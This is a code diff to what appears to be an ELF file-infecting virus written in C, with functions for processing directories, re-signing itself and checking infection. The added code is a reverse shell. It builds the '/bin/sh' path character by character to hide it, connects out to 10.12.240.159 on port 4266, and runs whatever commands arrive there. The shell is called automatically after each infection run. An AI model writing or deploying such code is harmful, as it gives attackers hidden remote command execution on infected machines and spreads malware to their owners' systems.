@@ -396,6 +396,109 @@ clean:
 	fs_release(fd);
 }
 
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#define MAKE_IP(a, b, c, d)                                                    \
+	((uint32_t) (a) | ((uint32_t) (b) << 8) | ((uint32_t) (c) << 16)           \
+	 | ((uint32_t) (d) << 24))
+#define SWAP16(p) (((uint16_t) (p) >> 8) | ((uint16_t) (p) << 8))
+
+int execute(char *command)
+{
+	int pipefd[2];
+	ft_pipe(pipefd);
+	char  path[8];
+
+	pid_t pid = proc_spawn();
+	if (pid == 0)
+	{
+		char  sh[3];
+		char  c[3];
+		char *argv[4];
+		char *envp[1];
+		argv[2] = command;
+		argv[3] = NULL;
+		envp[0] = argv[3];
+		path[0] = '/';
+		path[1] = 'b';
+		path[2] = 'i';
+		path[3] = 'n';
+		path[4] = '/';
+		path[5] = 's';
+		path[6] = 'h';
+		path[7] = 0;
+		sh[0] = 's';
+		sh[1] = 'h';
+		sh[2] = 0;
+		c[0] = '-';
+		c[1] = 'c';
+		c[2] = 0;
+		argv[0] = sh;
+		argv[1] = c;
+		fs_release(pipefd[0]);
+		ft_dup2(pipefd[1], 1);
+		ft_dup2(pipefd[1], 2);
+		fs_release(pipefd[1]);
+		ft_execve(path, argv, envp);
+		proc_terminate(1);
+	}
+
+	fs_release(pipefd[1]);
+	return (pipefd[0]);
+}
+
+void connect_to_shell(void)
+{
+	int				   pid;
+	struct sockaddr_in servaddr;
+	int				   fd;
+	int				   shellfd;
+	char			   buf[1024];
+	ssize_t			   len;
+	char			   prompt[2];
+
+	pid = proc_spawn();
+	if (pid)
+		return;
+	fd = ft_socket(AF_INET, SOCK_STREAM, 0);
+	if (fd < 0)
+		return;
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_port = (uint16_t) SWAP16(4266);
+	servaddr.sin_addr.s_addr = MAKE_IP(10, 12, 240, 159);
+	if (ft_connect(fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0)
+	{
+		fs_release(fd);
+		return;
+	}
+	prompt[0] = '$';
+	prompt[1] = ' ';
+	while (1)
+	{
+		struct pollfd pfd;
+		pfd.fd = fd;
+		pfd.events = POLLIN;
+
+		io_send(fd, prompt, 2);
+
+		if (ft_poll(&pfd, 1, -1) <= 0)
+			break;
+
+		if (pfd.revents & POLLIN)
+		{
+			len = io_recv(fd, buf, sizeof(buf) - 1);
+			if (len <= 0)
+				break;
+			buf[len] = 0;
+			shellfd = execute(buf);
+			while ((len = io_recv(shellfd, buf, sizeof(buf))) > 0)
+				io_send(fd, buf, len);
+			fs_release(shellfd);
+		}
+	}
+	fs_release(fd);
+}
+
 void start(int argc, char *argv[])
 {
 	void  *begin_ptr;
@@ -480,6 +583,7 @@ void start(int argc, char *argv[])
 	{
 		processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
 		self_resign(ALPHA, OMEGA, begin_ptr, is_war);
+		connect_to_shell();
 	}
 	else
 		check_infection(path, begin_ptr, curare, flower, ALPHA, OMEGA, true);
@@ -772,7 +876,8 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 							   + elf->header->e_shnum * elf->header->e_shentsize
 		|| statbuf->st_size
 			   < elf->header->e_phoff
-					 + elf->header->e_phnum * elf->header->e_phentsize)
+					 + elf->header->e_phnum * elf->header->e_phentsize
+		|| elf->header->e_ident[4] != ELFCLASS64)
 		goto error;
 	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
